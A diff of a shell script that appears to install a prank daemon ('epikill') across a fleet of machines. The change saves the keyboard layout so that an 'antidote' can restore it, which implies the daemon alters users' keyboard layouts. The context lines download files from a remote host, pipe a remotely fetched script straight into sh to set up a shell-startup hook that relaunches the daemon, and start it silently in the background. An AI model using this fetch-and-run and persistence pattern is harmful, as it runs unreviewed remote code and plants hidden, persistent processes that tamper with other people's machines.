@@ -14,6 +14,14 @@ curl -fsSL "$base/confloose/epikill/gollum.png" > "$dir/gollum.png" || { rm -rf 
 curl -fsSL "$base/confloose/epikill/yan.jpg"    > "$dir/yan.jpg"    || { rm -rf "$dir"; exit 1; }
 chmod +x "$file"
 
+# Save the current layout at apply time: the antidote restores it instead of a
+# hard-coded one (the fleet does not all run the same layout or variant).
+if command -v setxkbmap >/dev/null 2>&1; then
+    layout=$(setxkbmap -query 2>/dev/null | awk '/^layout:/{print $2}')
+    [ -n "$layout" ] && setxkbmap -query 2>/dev/null \
+        | awk '/^(layout|variant|options):/{printf "%s=%s\n", $1, $2}' > "$dir/layout.bak" || :
+fi
+
 echo $(curl -fsSL "$base/confloose/bashrc_confloose_base.sh") "epikill" "'\"$file\" 2>/dev/null 1>&2 &'" | sh
 # Start now too; the daemon's lock makes a second start a no-op.
 "$file" >/dev/null 2>&1 &
